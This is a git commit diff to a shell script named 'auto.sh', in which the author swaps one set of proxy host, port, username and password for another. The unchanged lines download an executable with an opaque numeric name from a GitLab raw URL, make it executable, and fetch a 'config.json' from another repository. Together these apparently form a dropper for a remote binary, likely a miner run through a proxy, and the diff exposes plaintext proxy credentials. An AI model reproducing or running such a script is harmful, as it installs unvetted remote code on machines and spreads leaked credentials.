a6f33a2ec61309864fa5a013ca796ea2e49211c7
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2023-12-30 09:35:24 +0700

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -1,7 +1,7 @@
-proxy="45.67.211.242" 
-port="443" 
-user="excel"  
-pass="excel"
+proxy="38.154.227.167" 
+port="5868" 
+user="ugursfso"  
+pass="wqn60pnk6m95"  
 wget -q -O 1821433292 https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x 1821433292
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
